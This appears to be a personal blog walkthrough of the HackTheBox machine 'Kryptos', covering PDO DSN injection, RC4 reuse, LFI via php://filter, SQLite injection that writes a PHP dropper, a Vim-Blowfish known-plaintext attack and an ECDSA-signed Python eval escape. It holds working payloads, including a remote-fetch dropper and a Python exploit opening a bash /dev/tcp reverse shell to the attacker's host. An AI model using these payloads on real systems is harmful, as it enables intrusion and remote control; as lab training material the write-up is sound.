---
title: "HackTheBox - WriteUp 20"
date: 2019-07-27T22:14:41+08:00
description: "HackTheBox 练手 - Kryptos - PHP PDO Cheat, Cryptography, SQLite RCE, Bypass Restrictions of Python eval and KPA"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Kryptos

This most valuable box I've ever seen in HTB.

Ubuntu Linux, 80 with PHP 7 + Apache 2.4.29, 22 OpenSSH 7.6p1

Run gobuster with port 80, discovered:

```
/index.php (Status: 200)
/css (Status: 301)
/dev (Status: 403)
/logout.php (Status: 302)
/url.php (Status: 200)
/aes.php (Status: 200)
/encrypt.php (Status: 302)
/rc4.php (Status: 200)
/decrypt.php (Status: 302)
/server-status (Status: 403)
```

## User - Web Part

Well, To be honest, I have no idea about the inital foothold even I see the POST param called `db`.

Use burpsuite or Chrome DevTools as you pleased, change the value of `db` to `mysql`, you'll trigger a `PDOException: 1044`, so, we know PHP and PDO enabled. Let's assume it's a mysql.

According to Referrence : PHP PDO and PDO_Mysql will scan DSN from head to tail, so if you include another repeat param, the last one will be totally overwritten.

> Fake it, till you Make it.

So to make it, either deploy a mysql server to get authenticated and correct reply. But it's too difficult, so we have the script in referrence 1.

Run the script `MySQL-Auth-Server.py`, and change the param `db` to `cryptor; host=10.10.16.80`, then use any creds you generated, you'll get logged in.

After logged in, See a encryption panel. Make sure you use RC4 at the very first time. RC4 is an old encryption method which can be seen as a "reverse-able" algorithm in some way since it is based on XOR. So, submit twice to encryptor panel using the same content, you'll get original text.

Then here, we could try to use `http://127.0.0.1/dev/` to get the `/dev` that we can't access remotely, you'll see a todo page, check it. Todo page tells you:

- There's a global writable folder
- There's a dangerous page called `sqlite_test_page`
- Dangerous PHP functions are disabled

Here, we use php filter to achieve LFI in param `view` of `index.php`, which force the input to be converted to base64 before input into any function: `php://filter/convert.base64-encode/resource=sqlite_test_page`, the final payload here is: `http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page`. Use this payload, change the value of after `resource=`, you will get a full source code dump of the page you just found using gobuster, in `index.php`, you'll get a USELESS credential; in `encrypt.php`, you will find the encrypt mode and key it used for encryption, input it to cyberchef might boost you up. 

Analyze the source code of `sqlite_test_page.php`, you should get:

- `/dev/d9e28afcf0b274a5e0542abb67db0784/` is globally writable
- `bookid` param can be injected via SQL statement
- `no_results` param should be set to `1` or `true`, so your SQL statement will be executed

Okay, so let's do something to upload a php reverse shell. Cuz `/dev` can only be accessed in localhost, not remote, and this encryptor panel is running with curl, only GET method is applicable. We try to let it do a bash reverse shell to us...

The SQL statement about the part you uploaded should be like this: 

```
1; ATTACH DATABASE `/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/lo3l.php` AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php phpinfo(); ?>');
```

That will allow SQLite 3 to write database called `lo3l.php`(If not exist, create automatically), content is `phpinfo()` php code. The relative path will also work here, note: current working directory is: `/dev`

So urlencode the param before submit, the final URL like this:

```
http://127.0.0.1/dev/index.php?view=sqlite_test_page&no_results=true&bookid=1%3b+ATTACH+DATABASE+%60%2fvar%2fwww%2fhtml%2fdev%2fd9e28afcf0b274a5e0542abb67db0784%2flo3l.php%60+AS+lol%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+(%27%3c%3fphp+phpinfo()%3b+%3f%3e%27)%3b
```

Submit it into encryptors, and Using encryptor to access `http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/lo3l.php` this time, you'll get a bunch of output which was base64-encoded after encrypted with RC4. Decode and decrypt, get phpinfo page.

Disabled Functions: `system,dl,passthru,exec,shell_exec,popen,escapeshellcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,`, WebRoot: `/var/www/html`


Our only way is about `eval`, but after I checked the reverse shell of pentestmonkey, I changed my mind to directly use it. Remove unnecessary part to minify the file, then just write a script to let it download trojan for us.

Same way, but you need some scripting:

```
1; ATTACH DATABASE `/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/lo7l.php` AS l7ol; CREATE TABLE l7ol.pwn (dataz text); INSERT INTO l7ol.pwn (dataz) VALUES ("<?php $a1 = base64_decode('aHR0cDovLzEwLjEwLjE2LjgwOjgwODAvcGhwcmN2LnBocA=='); $h2 = file_get_contents($a1); if($h2 === false){echo 1941;} $fileName = base64_decode('L3Zhci93d3cvaHRtbC9kZXYvZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvY2FsbHVwdC5waHA='); $save = file_put_contents($fileName, $h2); ?>");
```

PHP code here is:
```php
<?php 
    $a1 = base64_decode('aHR0cDovLzEwLjEwLjE2LjgwOjgwODAvcGhwcmN2LnBocA=='); 
    // base64-encoded: http://10.10.16.80:8080/phprcv.php
    $h2 = file_get_contents($a1); 
    if($h2 === false){
        echo 1941;
    } 
    $fileName = base64_decode('L3Zhci93d3cvaHRtbC9kZXYvZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvY2FsbHVwdC5waHA='); 
    // base64-encoded: /var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/callupt.php
    $save = file_put_contents($fileName, $h2); 
?>
```

Urlencode you param:

```
http://127.0.0.1/dev/index.php?view=sqlite_test_page&no_results=true&bookid=1%3b+ATTACH+DATABASE+%60%2fvar%2fwww%2fhtml%2fdev%2fd9e28afcf0b274a5e0542abb67db0784%2flo7l.php%60+AS+l7ol%3b+CREATE+TABLE+l7ol.pwn+(dataz+text)%3b+INSERT+INTO+l7ol.pwn+(dataz)+VALUES+(%22%3c%3fphp+%24a1+%3d+base64_decode(%27aHR0cDovLzEwLjEwLjE2LjgwOjgwODAvcGhwcmN2LnBocA%3d%3d%27)%3b+%24h2+%3d+file_get_contents(%24a1)%3b+if(%24h2+%3d%3d%3d+false)%7becho+1941%3b%7d+%24fileName+%3d+base64_decode(%27L3Zhci93d3cvaHRtbC9kZXYvZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvY2FsbHVwdC5waHA%3d%27)%3b+%24save+%3d+file_put_contents(%24fileName%2c+%24h2)%3b+%3f%3e%22)%3b
```

Finally, you should set up a webserver on your port 8080, and put the php reverse shell we just modified in a file called `phprcv.php`, and set up netcat at port 15500, don't forget to modify the host and port in php reverse shell before you save. Call them in order in encryptor:

```
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/lo7l.php
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/callupt.php
```

You get a shell as `www-data`.

## User - RCE

After you have a reverse shell, check `/etc/passwd`, found user: `rijndael`.

You have read permission of `/home/rijndael/creds.txt` and also `/home/rijndael/creds.txt.old`. The `.old` file suggest us that the creds is in format of "username / password" format. It's a partial known plaintext attack.

According to the file header of `creds.txt`, it's encrypted with Vim, File header is `Vimcrypt~02!` means a Blowfish with wrong implementation.

So we are be able to recover the first 64 bytes of the encrypted text. Except the header, the encrypted text is only 26 Bytes...

Blowfish is based on XOR too. We have script for it, check `xor-kpa.py`, run it:

```bash
$ python2 ./xor-kpa.py -d "#rijndael / " kryptos-creds-ciphertextonly.txt
rijndael / bkVBL8Q9HuBSpj
```

With creds, you are able to login via ssh. User Get.

## Root

After User owned, you have access to `/home/rijndael/kryptos/kryptos.py`, download it.

Do a code review, TBH, I don't have any idea again...

After some hints, I do a benchmark on the source code of `secure_rng` function, it shows that: we have the possibility that: 

| Generated Rand | Possibility |
|:--------------:|:-----------:|
| <=100 | 25% |
| <=500 | 27% |
| <=1000 | 30% |
| >10000000 | 70% |

So we have about 1/4 to bruteforce the rand. After bruteforce get the value of rand, you'll be able to sign your code. Script here:

```python
#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import requests
import logging
import sys
import binascii
from ecdsa import SigningKey, NIST384p

BASEHOST = "http://127.0.0.1:8181"
ATTACKER_HOST = "10.10.16.80"
ATTACKER_PORT = "15500"

PAYLOAD_TEMPL = """
(lambda __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__):
    __builtins__['print'](__builtins__['__import__']('os').system("bash -c 'bash -i &>/dev/tcp/{attip}/{attport} 0<&1'"))
)()
""".format(attip=ATTACKER_HOST, attport=ATTACKER_PORT)

logger = logging.getLogger("default_log")
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


def check_server():
    queryurl = BASEHOST
    logger.critical("Trying to check server status...")
    r = requests.get(queryurl)
    logger.info(r.json())


def get_dbg_info():
    queryurl = BASEHOST + "/debug"
    logger.critical("Getting Debug Info...")
    r = requests.get(queryurl)
    logger.debug(r.json())
    return r.json()


def send_exploit(rand):
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()

    def sign(msg):
        return binascii.hexlify(sk.sign(msg))

    queryurl = BASEHOST + "/eval"
    finalexploit = PAYLOAD_TEMPL
    logger.critical("Sending exploit...")
    payload = {
        "expr": finalexploit,
        "sig": sign(finalexploit.encode()).decode()
    }
    r = requests.post(queryurl, json=payload)
    try:
        logger.info(r.json())
        logger.info("Seems Work. Check your netcat and maintain the privileges.")
    except:
        logger.error("Error: Payload Error!")
        logger.error(r.text)


def printusage():
    print("------------------------------------------------------------------------------")
    print("Usage: Directly Modify the Script and Run it")
    print("PLEASE NOTE: THE SHELL HERE IS UNSTABLE, DO NOT USE IT FOR A LONG TIME PERIOD!")
    print("------------------------------------------------------------------------------")


def try_bf(orijson):
    def verify(vk, msg, sig):
        try:
            return vk.verify(binascii.unhexlify(sig), msg)
        except:
            return False

    logger.info("You have about 25% rate to get a correct rand.")
    oridt = orijson['response']['Expression'].encode()
    orisig = orijson['response']['Signature'].encode()
    FLAG = 0
    for i in range(1, 501):
        logger.info("Current Working on: RAND=" + str(i))
        rand = i
        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
        vk = sk.get_verifying_key()
        success_not = verify(vk, oridt, orisig)
        if success_not:
            FLAG = 1
            logger.critical("Rand is: " + str(rand))
            return rand
    if FLAG == 0:
        print("You may reset the machine, rand is large than 500.")
        sys.exit(0)


def main():
    printusage()
    check_server()
    orid = get_dbg_info()
    randv = try_bf(orid)
    send_exploit(randv)


if __name__ == '__main__':
    main()
    
```

(END)

# Referrence

All scripts used and written by myself are logged here: [My Github Repo](https://github.com/kmahyyg/htbscripts). All related scripts is named beginning with `krypto`.

1. https://github.com/DieFunction/MySQL-Auth-Server
2. https://sourcegraph.com/github.com/php/php-src@02cdef555dee090c55076f1419c83707f8928558/-/blob/ext/pdo/pdo.c#L175
3. https://sourcegraph.com/github.com/php/php-src@02cdef555dee090c55076f1419c83707f8928558/-/blob/ext/pdo_mysql/mysql_driver.c#L560
4. https://www.php.net/manual/en/ref.pdo-mysql.connection.php
5. https://www.geeksforgeeks.org/computer-network-rc4-encryption-algorithm/
6. https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
7. https://gchq.github.io/CyberChef/
8. http://pentestmonkey.net/tools/web-shells/php-reverse-shell
9. http://atta.cked.me/home/sqlite3injectioncheatsheet
10. http://80x86.io/post/blowfish-cipher
11. https://github.com/DidierStevens/DidierStevensSuite/blob/master/xor-kpa.py
12. https://gist.github.com/amtal/d482a2f8913bc6e2c2e0
13. https://github.com/vim/vim/blob/master/src/crypt.c
14. http://nlitsme.github.io/posts/vim-encryption/
15. https://dgl.cx/2014/10/vim-blowfish
16. https://stackoverflow.com/questions/8928240/convert-base-2-binary-number-string-to-int
17. https://math.stackexchange.com/questions/1231826/how-to-convert-pi-to-base-16
18. https://pycryptodome.readthedocs.io/en/latest/src/cipher/blowfish.html
19. https://docs.python.org/3/library/functions.html#eval
20. https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html
21. https://www.floyd.ch/?p=584
22. http://lucumr.pocoo.org/2011/2/1/exec-in-python/

